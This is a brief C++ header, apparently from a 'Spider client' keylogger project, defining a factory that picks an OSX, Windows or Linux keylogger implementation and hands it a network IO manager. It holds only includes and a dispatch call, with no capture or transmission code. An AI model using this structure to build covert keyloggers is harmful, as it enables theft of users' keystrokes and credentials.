//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_KEYLOGGERFACTORY_HPP
#define SPIDER_CLIENT_KEYLOGGERFACTORY_HPP

#include <utils/Config.hpp>
#include <KeyLogger/KeyLogger.hpp>

#ifdef USING_OSX
#include <KeyLogger/details/OSXKeyLogger.hpp>
#elif defined(USING_WINDOWS)
#include <KeyLogger/details/WinKeyLogger.hpp>
#elif defined(USING_LINUX)
#include <KeyLogger/details/LinuxKeyLogger.hpp>
#endif

namespace spi
{
    class Factory
    {
    public:
        static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
        {
            return details::createKeyLogger(service);
        }
    };
}

#endif //SPIDER_CLIENT_KEYLOGGERFACTORY_HPP
